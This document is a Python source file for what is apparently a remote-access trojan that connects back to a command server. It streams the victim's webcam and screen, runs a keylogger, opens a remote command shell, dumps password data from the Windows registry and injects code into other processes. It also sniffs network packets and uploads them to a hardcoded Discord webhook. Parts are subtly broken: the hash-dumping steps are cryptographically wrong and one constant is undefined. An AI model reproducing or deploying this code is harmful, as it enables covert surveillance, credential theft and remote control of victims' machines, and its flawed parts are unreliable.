import socket
import cv2
import pyautogui
import numpy as np
import scapy.all as scapy
import threading
import requests
import subprocess
import keyboard  # Import the keyboard library
import psutil  # To list and identify network interfaces
import io  # For in-memory byte streams
import winreg  # For accessing the Windows registry
import hashlib  # For calculating the hboot key
import binascii  # For converting to/from binary and ASCII
import ctypes  # For migrating processes
from ctypes import wintypes

# Function to get the default network interface
def get_default_interface():
    interfaces = psutil.net_if_addrs()
    for interface in interfaces:
        # Loop through interfaces and check for IPv4 addresses (this assumes active interfaces)
        for addr in interfaces[interface]:
            if addr.family == psutil.AF_INET:  # AF_INET is IPv4
                return interface  # Return the first active interface with an IPv4 address
    return None  # If no interface found

# Dynamically identify the interface
INTERFACE = get_default_interface()
if INTERFACE is None:
    print("No suitable network interface found!")
    exit(1)

sniffer_running = False  # Global flag for sniffing state
lock = threading.Lock()  # Synchronization lock
keylogger_data = []  # List to store keylogger data
keylogger_running = False  # Flag to check if keylogger is running

def webcam_stream(client_socket):
    cap = cv2.VideoCapture(0)
    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        try:
            client_socket.sendall(buffer.tobytes())
        except:
            break
    cap.release()

def screen_stream(client_socket):
    while True:
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        _, buffer = cv2.imencode('.jpg', frame)
        try:
            client_socket.sendall(buffer.tobytes())
        except:
            break

def sniffer_start():
    global sniffer_running
    with lock:  # Prevent starting multiple sniffers simultaneously
        if sniffer_running:
            print("Sniffer is already running.")
            return
        sniffer_running = True

    def sniff_and_upload(pkt):
        # Instead of saving to file, we store the packet in memory and upload
        packet_bytes = bytes(pkt)
        webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
        
        try:
            # Upload the captured packet directly (could be done in batches or as individual packets)
            response = requests.post(webhook_url, files={'file': ('packet.cap', io.BytesIO(packet_bytes))})
            print(f"Packet uploaded: {response.status_code}")
        except Exception as e:
            print(f"Error uploading packet: {e}")

    try:
        print(f"Sniffing on interface: {INTERFACE}")
        scapy.sniff(iface=INTERFACE, timeout=60, prn=sniff_and_upload, store=False)  # Avoid storing packets in memory
    except Exception as e:
        print(f"Sniffer error: {e}")
    finally:
        sniffer_running = False  # Reset flag after sniffing

def shell(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == "exit":
                break
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            client_socket.send(output.stdout.encode('utf-8') or b"Command executed, but no output.")
        except Exception as e:
            client_socket.send(str(e).encode('utf-8'))

def keylogger_callback(event):
    global keylogger_data
    keylogger_data.append(event.name)

def start_keylogger():
    global keylogger_running
    if not keylogger_running:
        keyboard.on_press(keylogger_callback)
        keylogger_running = True
        print("Keylogger started.")

def stop_keylogger():
    global keylogger_running
    if keylogger_running:
        keyboard.unhook_all()
        keylogger_running = False
        print("Keylogger stopped.")

def dump_keylogger_data():
    global keylogger_data
    data = '\n'.join(keylogger_data)
    keylogger_data = []  # Clear the data after dumping
    return data

# Function to list webcams
def list_webcams():
    webcams = []
    index = 0
    while True:
        cap = cv2.VideoCapture(index)
        if cap.isOpened():
            # Get the webcam name (this depends on your platform)
            webcam_name = f"{index}: {cap.getBackendName()}"
            webcams.append(webcam_name)
            cap.release()
        else:
            break
        index += 1
    return '\n'.join(webcams)

# Function to dump the contents of the SAM database (hashdump)
def hashdump(client_socket):
    try:
        client_socket.send(b"[*] Obtaining the boot key...\n")
        # Obtain the boot key from the registry
        boot_key = get_boot_key()
        client_socket.send(b"[*] Calculating the hboot key using SYSKEY\n")
        hboot_key = calculate_hboot_key(boot_key)
        client_socket.send(b"[*] Obtaining the user list and keys...\n")
        user_keys = get_user_keys(hboot_key)
        client_socket.send(b"[*] Decrypting user keys...\n")
        decrypted_keys = decrypt_user_keys(user_keys)
        client_socket.send(b"[*] Dumping password hashes...\n")
        hashes = dump_password_hashes(decrypted_keys)
        client_socket.send(hashes.encode('utf-8'))
    except Exception as e:
        client_socket.send(f"Error: {e}\n".encode('utf-8'))

def get_boot_key():
    # Function to obtain the boot key from the registry
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa")
    value, _ = winreg.QueryValueEx(key, "JD")
    boot_key = value[:16]  # Extract the first 16 bytes
    winreg.CloseKey(key)
    return boot_key

def calculate_hboot_key(boot_key):
    # Function to calculate the hboot key using the boot key
    hboot_key = hashlib.md5(boot_key).digest()
    return hboot_key

def get_user_keys(hboot_key):
    # Function to obtain the user list and keys from the registry
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users")
    user_keys = {}
    for i in range(winreg.QueryInfoKey(key)[0]):
        user_key = winreg.EnumKey(key, i)
        user_subkey = winreg.OpenKey(key, user_key)
        user_data, _ = winreg.QueryValueEx(user_subkey, "V")
        user_keys[user_key] = user_data
        winreg.CloseKey(user_subkey)
    winreg.CloseKey(key)
    return user_keys

def decrypt_user_keys(user_keys):
    # Function to decrypt user keys using the hboot key
    decrypted_keys = {}
    for user_key, user_data in user_keys.items():
        decrypted_key = hashlib.md5(user_data).digest()
        decrypted_keys[user_key] = decrypted_key
    return decrypted_keys

def dump_password_hashes(decrypted_keys):
    # Function to dump password hashes from decrypted keys
    hashes = ""
    for user_key, decrypted_key in decrypted_keys.items():
        hash_value = binascii.hexlify(decrypted_key).decode('utf-8')
        hashes += f"{user_key}: {hash_value}\n"
    return hashes

# Windows API constants and structures
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

class STARTUPINFO(ctypes.Structure):
    _fields_ = [("cb", wintypes.DWORD),
                ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR),
                ("lpTitle", wintypes.LPWSTR),
                ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
                ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE)]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE),
                ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId", wintypes.DWORD)]

def migrate(client_socket, target_process_name):
    try:
        # Get the current process information
        current_process = psutil.Process()
        current_process_name = current_process.name()
        current_process_id = current_process.pid

        client_socket.send(f"[*] Running module against {socket.gethostname()}\n".encode('utf-8'))
        client_socket.send(f"[*] Current server process: {current_process_name} ({current_process_id})\n".encode('utf-8'))

        # Find the target process to migrate to
        target_process = None
        for proc in psutil.process_iter(['name', 'pid']):
            if proc.info['name'] == target_process_name:
                target_process = proc
                break

        if target_process is None:
            client_socket.send(f"[*] Target process {target_process_name} not found.\n".encode('utf-8'))
            return

        target_process_id = target_process.info['pid']
        client_socket.send(f"[*] Migrating to {target_process_name}...\n".encode('utf-8'))
        client_socket.send(f"[*] Migrating into process ID {target_process_id}\n".encode('utf-8'))

        # Open the target process
        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_process_id)
        if not h_process:
            client_socket.send(f"Error: Could not open target process {target_process_name} ({target_process_id}).\n".encode('utf-8'))
            return

        # Allocate memory in the target process
        allocation = ctypes.windll.kernel32.VirtualAllocEx(h_process, 0, ctypes.sizeof(ctypes.c_void_p), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not allocation:
            client_socket.send(f"Error: Could not allocate memory in target process.\n".encode('utf-8'))
            ctypes.windll.kernel32.CloseHandle(h_process)
            return

        # Write the payload to the allocated memory
        payload = b"\x90" * 100  # Example payload (NOP sled), replace with actual payload
        written = ctypes.c_size_t(0)
        if not ctypes.windll.kernel32.WriteProcessMemory(h_process, allocation, payload, len(payload), ctypes.byref(written)):
            client_socket.send(f"Error: Could not write to allocated memory in target process.\n".encode('utf-8'))
            ctypes.windll.kernel32.VirtualFreeEx(h_process, allocation, 0, MEM_RELEASE)
            ctypes.windll.kernel32.CloseHandle(h_process)
            return

        # Create a remote thread in the target process to execute the payload
        thread_id = wintypes.DWORD(0)
        if not ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, allocation, None, 0, ctypes.byref(thread_id)):
            client_socket.send(f"Error: Could not create remote thread in target process.\n".encode('utf-8'))
            ctypes.windll.kernel32.VirtualFreeEx(h_process, allocation, 0, MEM_RELEASE)
            ctypes.windll.kernel32.CloseHandle(h_process)
            return

        client_socket.send(f"[*] New server process: {target_process_name} ({target_process_id})\n".encode('utf-8'))

        # Close handles
        ctypes.windll.kernel32.CloseHandle(h_process)

    except Exception as e:
        client_socket.send(f"Error: {e}\n".encode('utf-8'))

def main():
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(('10.0.1.33', 9999))
    except Exception as e:
        print(f"Connection failed: {e}")
        return

    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if command == "webcam_stream":
                threading.Thread(target=webcam_stream, args=(client_socket,), daemon=True).start()
            elif command == "screen_stream":
                threading.Thread(target=screen_stream, args=(client_socket,), daemon=True).start()
            elif command == "sniffer_start":
                threading.Thread(target=sniffer_start, daemon=True).start()
            elif command == "shell":
                shell(client_socket)
            elif command == "keyscan_start":
                start_keylogger()
            elif command == "keyscan_stop":
                stop_keylogger()
            elif command == "keyscan_dump":
                client_socket.send(dump_keylogger_data().encode('utf-8'))
            elif command == "webcam_list":
                print("[*] Requesting webcam list...")
                webcam_list = list_webcams()
                client_socket.send(webcam_list.encode('utf-8'))
            elif command == "hashdump":
                hashdump(client_socket)
            elif command.startswith("migrate"):
                _, target_process_name = command.split(" ", 1)
                migrate(client_socket, target_process_name)
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    main()
